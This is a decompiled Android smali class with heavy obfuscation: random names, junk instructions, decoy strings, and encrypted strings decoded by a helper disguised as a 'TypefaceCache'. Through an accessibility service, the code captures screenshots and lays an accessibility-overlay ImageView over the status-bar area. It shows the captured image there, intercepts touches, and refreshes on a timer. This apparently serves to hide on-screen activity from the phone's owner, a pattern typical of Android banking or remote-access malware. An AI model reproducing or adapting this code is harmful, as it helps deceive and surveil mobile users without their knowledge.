.class public final Lv/s/s50M5De8F5UWQVP09E;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"


# static fields
.field public static final synthetic ibVTtJUNfrGYbW:I


# instance fields
.field public Ee8d2j4S9Vm5yGuR:I

.field public JXn4Qf7zpnLjP5:Z

.field public final dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/DataQFAdapter;

.field public vekpFI4d1Nc4fakF:Landroid/widget/ImageView;

.field public final w9sT1Swbhx3hs:Landroid/os/Handler;

.field public final xDyLpEZyrcKVe0:Lv/s/YqOiSVb2wSv9Lq63qb;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 1
    const-string v0, "00100062005A009300E500AC00F000A600310059004D008200E200B300D300BE"

    .line 2
    .line 3
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    return-void
.end method

.method public constructor <init>(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 1

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 2
    .line 3
    .line 4
    iput-object p1, p0, Lv/s/s50M5De8F5UWQVP09E;->dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 5
    .line 6
    new-instance p1, Landroid/os/Handler;

    .line 7
    .line 8
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 9
    .line 10
    .line 11
    move-result-object v0

    .line 12
    invoke-direct {p1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 13
    .line 14
    .line 15
    iput-object p1, p0, Lv/s/s50M5De8F5UWQVP09E;->w9sT1Swbhx3hs:Landroid/os/Handler;

    .line 16
    .line 17
    new-instance p1, Lv/s/YqOiSVb2wSv9Lq63qb;

    .line 18
    .line 19
    const/16 v0, 0x7

    .line 20
    invoke-direct {p1, v0, p0}, Lv/s/YqOiSVb2wSv9Lq63qb;-><init>(ILjava/lang/Object;)V

    .line 21
    .line 22
    .line 23
    iput-object p1, p0, Lv/s/s50M5De8F5UWQVP09E;->xDyLpEZyrcKVe0:Lv/s/YqOiSVb2wSv9Lq63qb;

    .line 24
    .line 25
    return-void
.end method

.method private static synthetic zanxfaqka()V
    .locals 1

    const-string v0, "net.model.vzee"

    const-string v0, "org.utils.rrblkkozf"

    const-string v0, "Cancel"

    const-string v0, "ViewModel"

    const-string v0, "primary"

    const-string v0, "Preferences"

    const-string v0, "Fragment"

    const-string v0, "utf-8"

    const-string v0, "UTF-8"

    return-void
.end method


# virtual methods
.method public final dDIMxZXP1V8HdM()Landroid/graphics/Bitmap;
    .locals 6

    .line 1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 2
    .line 3
    const v1, 0x1e

    .line 4
    .line 5
    const/16 v2, 0x0

    .line 6
    if-ge v0, v1, :cond_0

    .line 7
    .line 8
    return-object v2

    .line 9
    :cond_0
    :try_start_0
    new-instance v0, Ljava/util/concurrent/CountDownLatch;

    nop

    .line 10
    .line 11
    const/4 v1, 0x1

    .line 12
    invoke-direct {v0, v1}, Ljava/util/concurrent/CountDownLatch;-><init>(I)V

    .line 13
    .line 14
    .line 15
    new-instance v1, Lv/s/aqjfZUF02xH6w;

    .line 16
    .line 17
    invoke-direct {v1}, Ljava/lang/Object;-><init>()V

    .line 18
    .line 19
    .line 20
    iget-object v3, p0, Lv/s/s50M5De8F5UWQVP09E;->dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/DataQFAdapter;

    nop

    nop

    .line 21
    .line 22
    invoke-static {v3}, Lv/s/mO9JXzSKOM66Z1;->ibVTtJUNfrGYbW(Lapp/mobilex/plus/services/DataQFAdapter;)Ljava/util/concurrent/Executor;

    .line 23
    .line 24
    .line 25
    move-result-object v4

    .line 26
    new-instance v5, Lv/s/EXFdIC4sJuGvFXtBxD;

    .line 27
    .line 28
    invoke-direct {v5, p0, v1, v0}, Lv/s/EXFdIC4sJuGvFXtBxD;-><init>(Lv/s/s50M5De8F5UWQVP09E;Lv/s/aqjfZUF02xH6w;Ljava/util/concurrent/CountDownLatch;)V

    .line 29
    .line 30
    .line 31
    invoke-static {v3, v4, v5}, Lv/s/VhkhkItRHoue;->hjneShqpF9Tis4(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V

    .line 32
    .line 33
    .line 34
    sget-object v3, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    .line 35
    .line 36
    const-wide/16 v4, 0x2

    .line 37
    .line 38
    invoke-virtual {v0, v4, v5, v3}, Ljava/util/concurrent/CountDownLatch;->await(JLjava/util/concurrent/TimeUnit;)Z

    .line 39
    .line 40
    .line 41
    iget-object v0, v1, Lv/s/aqjfZUF02xH6w;->w9sT1Swbhx3hs:Ljava/lang/Object;

    .line 42
    .line 43
    check-cast v0, Landroid/graphics/Bitmap;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 44
    .line 45
    return-object v0

    .line 46
    :catchall_0
    move-exception v0

    nop

    nop

    .line 47
    const-string v1, "00200077004B009300E500AD00D70091002A0077007A008400F300BA00C100B4002A00740052008B00F900AB00CB009400200064005E008200FE00AC00DA00A800370036005E009500E200B000C000FD0063"

    .line 48
    .line 49
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 50
    .line 51
    .line 52
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 53
    .line 54
    .line 55
    return-object v2
.end method

.method public final vekpFI4d1Nc4fakF()V
    .locals 11

    .line 1
    iget-object v0, p0, Lv/s/s50M5De8F5UWQVP09E;->dDIMxZXP1V8HdM:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 2
    .line 3
    iget-boolean v1, p0, Lv/s/s50M5De8F5UWQVP09E;->JXn4Qf7zpnLjP5:Z

    .line 4
    .line 5
    if-eqz v1, :cond_0

    .line 6
    .line 7
    goto/16 :goto_4

    .line 8
    .line 9
    :cond_0
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 10
    .line 11
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 12
    .line 13
    .line 14
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getAccessWindowManager$cp()Landroid/view/WindowManager;

    .line 15
    .line 16
    .line 17
    move-result-object v1

    .line 18
    if-nez v1, :cond_1

    .line 19
    .line 20
    goto/16 :goto_4

    .line 21
    .line 22
    :cond_1
    const/4 v2, 0x0

    .line 23
    :try_start_0
    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    .line 24
    .line 25
    .line 26
    move-result-object v3

    .line 27
    const-string v4, "00300062005A009300E500AC00ED00A5002200640064008F00F500B600D500AF0037"

    .line 28
    .line 29
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 30
    .line 31
    .line 32
    move-result-object v4

    .line 33
    const-string v5, "0027007F0056008200FE"

    .line 34
    .line 35
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 36
    .line 37
    .line 38
    move-result-object v5

    .line 39
    const-string v6, "00220078005F009500FF00B600D6"

    .line 40
    .line 41
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 42
    .line 43
    .line 44
    move-result-object v6

    .line 45
    invoke-virtual {v3, v4, v5, v6}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    .line 46
    .line 47
    .line 48
    move-result v3

    .line 49
    :goto_0
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    .line 50
    .line 51
    .line 52
    move-result-object v4

    nop

    nop

    .line 53
    invoke-virtual {v4}, Ljava/util/Locale;->toString()Ljava/lang/String;

    .line 54
    .line 55
    .line 56
    move-result-object v4

    .line 57
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 58
    .line 59
    .line 60
    move-result v4

    .line 61
    const v5, 0x3e7

    .line 62
    .line 63
    if-le v4, v5, :cond_2

    .line 64
    .line 65
    invoke-static {}, Ljava/lang/System;->nanoTime()J

    .line 66
    .line 67
    .line 68
    move-result-wide v4

    .line 69
    invoke-static {v4, v5}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    .line 70
    .line 71
    .line 72
    goto/16 :goto_0

    .line 73
    :cond_2
    if-lez v3, :cond_3

    .line 74
    .line 75
    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    .line 76
    .line 77
    .line 78
    move-result-object v4

    .line 79
    invoke-virtual {v4, v3}, Landroid/content/res/Resources;->getDimensionPixelSize(I)I

    .line 80
    .line 81
    .line 82
    move-result v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 83
    goto/16 :goto_1

    .line 84
    :catch_0
    :cond_3
    move v3, v2

    .line 85
    :goto_1
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 86
    .line 87
    const v5, 0x1c

    .line 88
    .line 89
    if-lt v4, v5, :cond_6

    .line 90
    .line 91
    :try_start_1
    const-string v5, "window"

    .line 92
    .line 93
    invoke-virtual {v0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 94
    .line 95
    .line 96
    move-result-object v5

    .line 97
    instance-of v6, v5, Landroid/view/WindowManager;

    .line 98
    .line 99
    if-eqz v6, :cond_4

    nop

    .line 100
    .line 101
    check-cast v5, Landroid/view/WindowManager;

    .line 102
    .line 103
    goto/16 :goto_2

    .line 104
    :cond_4
    const/4 v5, 0x0

    .line 105
    :goto_2
    const/16 v6, 0x1d

    nop

    .line 106
    .line 107
    if-lt v4, v6, :cond_5

    .line 108
    .line 109
    if-eqz v5, :cond_5

    .line 110
    .line 111
    invoke-interface {v5}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    .line 112
    .line 113
    .line 114
    move-result-object v4

    .line 115
    if-eqz v4, :cond_5

    .line 116
    .line 117
    invoke-static {v4}, Lv/s/JW3Lh9hxwLsO2ArTlH;->b1EoSIRjJHO5(Landroid/view/Display;)Landroid/view/DisplayCutout;

    .line 118
    .line 119
    .line 120
    move-result-object v4

    .line 121
    if-eqz v4, :cond_5

    .line 122
    .line 123
    invoke-static {v4}, Lv/s/mO9JXzSKOM66Z1;->dDIMxZXP1V8HdM(Landroid/view/DisplayCutout;)I

    .line 124
    .line 125
    .line 126
    move-result v4
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 127
    goto :goto_3

    .line 128
    :cond_5
    move v4, v2

    .line 129
    :goto_3
    if-le v4, v3, :cond_6

    .line 130
    .line 131
    move v3, v4

    nop

    .line 132
    :catch_1
    :cond_6
    if-gtz v3, :cond_7

    .line 133
    .line 134
    const/16 v3, 0x18

    .line 135
    .line 136
    int-to-float v3, v3

    .line 137
    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    .line 138
    .line 139
    .line 140
    move-result-object v4

    .line 141
    invoke-virtual {v4}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    .line 142
    .line 143
    .line 144
    move-result-object v4

    .line 145
    iget v4, v4, Landroid/util/DisplayMetrics;->density:F

    .line 146
    .line 147
    mul-float/2addr v3, v4

    .line 148
    float-to-int v3, v3

    .line 149
    :cond_7
    iput v3, p0, Lv/s/s50M5De8F5UWQVP09E;->Ee8d2j4S9Vm5yGuR:I

    .line 150
    .line 151
    if-gtz v3, :cond_8

    .line 152
    .line 153
    const-string v0, "000000770055008900FF00AB009200A300260062005E009500FD00B600DC00A200630065004F008600E400AA00C100E700210077004900C700F800BA00DB00A0002B0062001700C700E300B400DB00B70033007F0055008000B000B000C400A20031007A005A009E"

    .line 154
    .line 155
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 156
    .line 157
    .line 158
    return-void

    .line 159
    :cond_8
    :try_start_2
    new-instance v3, Landroid/widget/ImageView;

    nop

    nop

    .line 160
    .line 161
    invoke-direct {v3, v0}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    .line 162
    .line 163
    .line 164
    sget-object v0, Landroid/widget/ImageView$ScaleType;->FIT_XY:Landroid/widget/ImageView$ScaleType;

    .line 165
    .line 166
    invoke-virtual {v3, v0}, Landroid/widget/ImageView;->setScaleType(Landroid/widget/ImageView$ScaleType;)V

    .line 167
    .line 168
    .line 169
    new-instance v0, Lv/s/UX1wumA9o1nH9kfC;

    .line 170
    .line 171
    const/16 v4, 0x1

    .line 172
    invoke-direct {v0, v4, p0}, Lv/s/UX1wumA9o1nH9kfC;-><init>(ILjava/lang/Object;)V

    .line 173
    .line 174
    .line 175
    invoke-virtual {v3, v0}, Landroid/view/View;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 176
    .line 177
    .line 178
    new-instance v5, Landroid/view/WindowManager$LayoutParams;

    .line 179
    .line 180
    iget v7, p0, Lv/s/s50M5De8F5UWQVP09E;->Ee8d2j4S9Vm5yGuR:I

    nop

    .line 181
    .line 182
    const v9, 0x40328

    .line 183
    .line 184
    .line 185
    const/16 v10, -0x3

    .line 186
    const/4 v6, -0x1

    .line 187
    const/16 v8, 0x7f0

    nop

    nop

    .line 188
    .line 189
    invoke-direct/range {v5 .. v10}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 190
    .line 191
    .line 192
    const v0, 0x800033

    .line 193
    .line 194
    .line 195
    iput v0, v5, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 196
    .line 197
    iput v2, v5, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 198
    .line 199
    iput v2, v5, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 200
    .line 201
    invoke-interface {v1, v3, v5}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 202
    .line 203
    .line 204
    iput-object v3, p0, Lv/s/s50M5De8F5UWQVP09E;->vekpFI4d1Nc4fakF:Landroid/widget/ImageView;

    .line 205
    .line 206
    const/4 v0, 0x1

    .line 207
    iput-boolean v0, p0, Lv/s/s50M5De8F5UWQVP09E;->JXn4Qf7zpnLjP5:Z

    nop

    nop

    .line 208
    .line 209
    invoke-virtual {p0}, Lv/s/s50M5De8F5UWQVP09E;->w9sT1Swbhx3hs()V

    .line 210
    .line 211
    .line 212
    iget-object v0, p0, Lv/s/s50M5De8F5UWQVP09E;->w9sT1Swbhx3hs:Landroid/os/Handler;

    .line 213
    .line 214
    iget-object v1, p0, Lv/s/s50M5De8F5UWQVP09E;->xDyLpEZyrcKVe0:Lv/s/YqOiSVb2wSv9Lq63qb;

    .line 215
    .line 216
    const-wide/32 v2, 0x9c40

    .line 217
    .line 218
    .line 219
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 220
    .line 221
    .line 222
    const-string v0, "00100062005A009300E500AC009200A500220064001B008800E600BA00C000AB0022006F001B009400F800B000C500A90063003E0053008200F900B800DA00B3007E"

    .line 223
    .line 224
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 225
    .line 226
    .line 227
    goto :goto_4

    .line 228
    :catch_2
    move-exception v0

    .line 229
    const-string v1, "000500770052008B00F500BB009200B3002C00360048008F00FF00A8009200A8003500730049008B00F100A6008800E7"

    .line 230
    .line 231
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 232
    .line 233
    .line 234
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 235
    .line 236
    .line 237
    :goto_4
    return-void
.end method

.method public final w9sT1Swbhx3hs()V
    .locals 3

    .line 1
    iget-boolean v0, p0, Lv/s/s50M5De8F5UWQVP09E;->JXn4Qf7zpnLjP5:Z

    nop

    nop

    .line 2
    .line 3
    if-nez v0, :cond_0

    .line 4
    .line 5
    goto/16 :goto_3

    .line 6
    :cond_0
    :try_start_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 7
    .line 8
    const/16 v1, -0x3

    add-int/lit8 v1, v1, 0x21

    .line 9
    .line 10
    const/4 v2, 0x0

    .line 11
    if-lt v0, v1, :cond_1

    .line 12
    .line 13
    :try_start_1
    invoke-virtual {p0}, Lv/s/s50M5De8F5UWQVP09E;->dDIMxZXP1V8HdM()Landroid/graphics/Bitmap;

    .line 14
    .line 15
    .line 16
    move-result-object v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 17
    if-eqz v0, :cond_1

    .line 18
    .line 19
    goto :goto_0

    .line 20
    :catchall_0
    :cond_1
    move-object v0, v2

    .line 21
    :goto_0
    :try_start_2
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    .line 22
    .line 23
    .line 24
    move-result-object v1

    .line 25
    invoke-virtual {v1}, Ljava/lang/Thread;->getName()Ljava/lang/String;

    .line 26
    .line 27
    .line 28
    const/4 v1, 0x0

    .line 29
    if-eqz v0, :cond_3

    .line 30
    .line 31
    iget-object v2, p0, Lv/s/s50M5De8F5UWQVP09E;->vekpFI4d1Nc4fakF:Landroid/widget/ImageView;

    .line 32
    .line 33
    if-eqz v2, :cond_2

    .line 34
    .line 35
    invoke-virtual {v2, v0}, Landroid/widget/ImageView;->setImageBitmap(Landroid/graphics/Bitmap;)V

    .line 36
    .line 37
    .line 38
    goto :goto_1

    .line 39
    :catch_0
    move-exception v0

    .line 40
    goto :goto_2

    .line 41
    :cond_2
    :goto_1
    iget-object v0, p0, Lv/s/s50M5De8F5UWQVP09E;->vekpFI4d1Nc4fakF:Landroid/widget/ImageView;

    .line 42
    .line 43
    if-eqz v0, :cond_5

    .line 44
    .line 45
    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundColor(I)V

    .line 46
    .line 47
    .line 48
    goto/16 :goto_3

    nop

    nop

    .line 49
    :cond_3
    iget-object v0, p0, Lv/s/s50M5De8F5UWQVP09E;->vekpFI4d1Nc4fakF:Landroid/widget/ImageView;

    .line 50
    .line 51
    if-eqz v0, :cond_4

    .line 52
    .line 53
    invoke-virtual {v0, v2}, Landroid/widget/ImageView;->setImageBitmap(Landroid/graphics/Bitmap;)V

    .line 54
    .line 55
    .line 56
    :cond_4
    iget-object v0, p0, Lv/s/s50M5De8F5UWQVP09E;->vekpFI4d1Nc4fakF:Landroid/widget/ImageView;

    .line 57
    .line 58
    if-eqz v0, :cond_5

    .line 59
    .line 60
    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundColor(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 61
    .line 62
    .line 63
    goto :goto_3

    nop

    .line 64
    :goto_2
    const-string v1, "001000750049008200F500B100C100AF002C0062001B009500F500B900C000A20030007E001B008100F100B600DE00A20027002C001B"

    nop

    .line 65
    .line 66
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 67
    .line 68
    .line 69
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 70
    .line 71
    .line 72
    :cond_5
    :goto_3
    return-void
.end method
